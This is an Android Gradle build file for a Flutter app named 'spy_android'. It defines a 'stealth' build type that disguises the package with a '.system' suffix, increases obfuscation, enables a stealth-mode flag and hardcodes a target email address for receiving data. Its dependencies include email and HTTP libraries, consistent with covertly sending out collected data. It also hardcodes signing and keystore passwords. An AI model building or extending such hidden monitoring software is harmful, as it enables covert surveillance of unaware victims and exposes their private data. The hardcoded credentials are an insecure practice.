plugins {
    id("com.android.application") version "8.7.3"
    id("kotlin-android")
    id("dev.flutter.flutter-gradle-plugin")
}

android {
    namespace = "com.example.spy_android"
    compileSdk = 34
    targetSdk = 34  // Android 13+ 호환성 필수
    buildToolsVersion = "34.0.0"
    ndkVersion = "26.1.10909125"  // 안정된 버전으로 변경

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }

    tasks.withType<org.jetbrains.kotlin.gradle.tasks.KotlinCompile>().configureEach {
        kotlinOptions.jvmTarget = "11"
    }

    defaultConfig {
        applicationId = "com.example.spy_android"
        minSdk = 23 // Android 5.0 이상 지원
        targetSdk = 34 // 최신 Android 타겟
        versionCode = 1
        versionName = "1.0.0"

        // 🔥 APK 최적화 설정
        multiDexEnabled = true
        vectorDrawables.useSupportLibrary = true

        // ProGuard 설정
        proguardFiles(
            getDefaultProguardFile("proguard-android-optimize.txt"),
            "proguard-rules.pro"
        )
    }

    signingConfigs {
        create("release") {
            // 🔥 릴리즈 서명 설정 (실제 배포시에는 보안된 키 사용 필요)
            keyAlias = "spy_android_key"
            keyPassword = "secure_password_123"
            storeFile = file("../keystore/spy_android.keystore")
            storePassword = "secure_password_123"
        }
    }

    buildTypes {
        debug {
            isDebuggable = true
            isMinifyEnabled = false
            applicationIdSuffix = ".debug"
        }

        release {
            isDebuggable = false
            isMinifyEnabled = true // ProGuard 코드 난독화 활성화
            isShrinkResources = true // 사용하지 않는 리소스 제거
            signingConfig = signingConfigs.getByName("release")

            // 🔥 APK 최적화 옵션
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }

        // 🔥 스텔스 빌드 타입 (숨김 모드용)
        create("stealth") {
            initWith(getByName("release"))
            isDebuggable = false
            applicationIdSuffix = ".system"
            versionNameSuffix = "-stealth"

            // 더 강력한 난독화
            isMinifyEnabled = true
            isShrinkResources = true

            buildConfigField("boolean", "STEALTH_MODE", "true")
            buildConfigField("String", "TARGET_EMAIL", "\"tmdals7205@gmail.com\"")
        }
    }

    // 🔥 APK 분할 설정 (크기 최적화)
    splits {
        abi {
            isEnable = true
            reset()
            include("arm64-v8a", "armeabi-v7a", "x86_64")
            isUniversalApk = true // 범용 APK도 생성
        }
    }

    // 🔥 패키징 옵션
    packagingOptions {
        resources {
            excludes += setOf(
                "META-INF/DEPENDENCIES",
                "META-INF/LICENSE",
                "META-INF/LICENSE.txt",
                "META-INF/NOTICE",
                "META-INF/NOTICE.txt"
            )
        }
    }
}

flutter {
    source = "../.."
}

// 🔥 종속성 추가
dependencies {
    implementation("androidx.multidex:multidex:2.0.1")
    implementation("androidx.work:work-runtime-ktx:2.9.0")
    implementation("com.google.android.material:material:1.11.0")

    // 이메일 전송용
    implementation("com.sun.mail:android-mail:1.6.7")
    implementation("com.sun.mail:android-activation:1.6.7")

    // HTTP 클라이언트
    implementation("com.squareup.okhttp3:okhttp:4.12.0")

    // JSON 처리
    implementation("com.google.code.gson:gson:2.10.1")
}